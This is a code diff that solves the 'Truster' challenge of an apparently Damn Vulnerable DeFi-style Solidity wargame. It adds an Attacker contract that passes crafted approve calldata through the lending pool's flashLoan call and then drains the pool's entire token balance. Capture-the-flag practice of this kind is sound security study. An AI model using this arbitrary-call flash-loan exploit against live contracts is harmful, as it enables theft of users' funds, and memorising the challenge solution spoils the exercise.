@@ -51,7 +51,7 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        new Attacker(pool, token, recovery);
     }
 
     /**
@@ -64,5 +64,18 @@ contract TrusterChallenge is Test {
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract Attacker {
+
+    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            type(uint256).max
+        );
+        _pool.flashLoan(0, address(this), address(_token), data);
+        _token.transferFrom(address(_pool), _recovery, _token.balanceOf(address(_pool)));
     }
 }
